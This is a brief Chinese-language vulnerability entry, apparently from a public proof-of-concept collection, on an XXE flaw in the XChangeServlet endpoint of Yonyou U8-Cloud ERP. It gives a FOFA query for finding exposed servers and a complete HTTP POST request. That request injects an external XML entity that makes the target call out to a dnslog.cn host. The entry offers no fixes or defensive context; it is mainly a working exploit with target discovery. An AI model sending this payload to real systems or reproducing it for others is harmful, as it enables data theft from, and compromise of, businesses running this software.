## 用友U8-Cloud系统XChangeServlet接口存在XXE漏洞

用友U8 cloud 聚焦成长型、创新型企业的云 ERP，基于全新的企业互联网应用设计理念，为企业提供集人财物客、产供销于一体的云 ERP 整体解决方案，全面支持多组织业务协同、智能财务，人力服务、构建产业链智造平台，融合用友云服务实现企业互联网资源连接、共享、协同。该系统/service/XChangeServlet接口存在XXE漏洞，攻击者可以在xml中构造恶意命令，会导致服务器数据泄露以及被远控。



## fofa

```
app="用友-U8-Cloud"
```



## poc

```
POST /service/XChangeServlet HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Content-Length: 129
Connection: close
Content-Type: text/xml
Accept-Encoding: gzip

<!DOCTYPE r [<!ELEMENT r ANY ><!ENTITY xxe SYSTEM "http://jbiag2.dnslog.cn/mt">]><r><a>&xxe;</a ></r>
```

![image-20240521200556542](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405212005621.png)